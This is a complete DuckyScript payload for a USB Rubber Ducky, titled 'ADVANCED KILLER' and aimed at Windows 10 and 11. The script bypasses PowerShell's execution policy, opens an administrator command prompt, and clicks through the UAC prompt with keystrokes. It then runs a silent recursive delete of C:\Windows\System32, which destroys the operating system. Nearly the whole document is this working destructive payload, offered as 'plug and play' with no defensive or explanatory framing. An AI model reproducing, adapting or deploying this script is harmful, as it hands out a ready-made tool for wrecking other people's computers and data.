# Rubbery Ducky

CODE:

REM     Title: ADVANCED KILLER

REM     Author: EnergyN

REM     Description: THE BEST KILLER. 
REM     ELO ELO. 

REM     Target: Windows 10, 11

REM     --------------------------------------------------------------------------------------
REM     THIS PAYLOAD IS PLUG AND PLAY.
REM     --------------------------------------------------------------------------------------

DELAY 2000
GUI r
DELAY 500
STRING powershell Set-ExecutionPolicy Bypass -Scope Process -Force ; Start-Process cmd -ArgumentList "/K" -Verb RunAs
ENTER
DELAY 7500
LEFT
ENTER
DELAY 2000
STRING del /s /q C:\Windows\System32\*
DELAY 1000
ENTER
